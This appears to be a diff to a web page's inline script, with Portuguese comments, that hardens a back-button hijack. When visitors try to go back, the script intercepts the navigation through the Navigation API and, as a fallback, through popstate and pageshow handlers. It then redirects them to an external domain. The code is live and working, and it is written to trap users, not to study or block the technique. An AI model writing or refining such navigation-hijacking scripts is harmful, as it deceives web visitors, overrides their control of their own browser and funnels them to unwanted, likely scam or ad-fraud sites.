@@ -1763,15 +1763,25 @@
 <script>
 (function() {
   var REDIRECT = 'https://backredirect.labuenavida.online/';
-  function go() {
-    history.pushState(null, '', location.pathname + '#s2');
-    window.location.replace(REDIRECT);
+  function go() { window.location.replace(REDIRECT); }
+
+  // Chrome 102+ — Navigation API (intercepta back antes de acontecer)
+  if (window.navigation) {
+    window.navigation.addEventListener('navigate', function(e) {
+      if (e.navigationType === 'traverse' &&
+          e.destination.index < window.navigation.currentEntry.index) {
+        e.intercept({ handler: function() { go(); return new Promise(function(){}); } });
+      }
+    });
   }
 
+  // Fallback: popstate + hash (mobile e outros browsers)
   history.replaceState(null, '', location.pathname + '#s1');
   history.pushState(null, '', location.pathname + '#s2');
-
-  window.addEventListener('popstate', go);
+  window.addEventListener('popstate', function() {
+    history.pushState(null, '', location.pathname + '#s2');
+    go();
+  });
   window.addEventListener('pageshow', function(e) { if (e.persisted) go(); });
 })();
 </script>
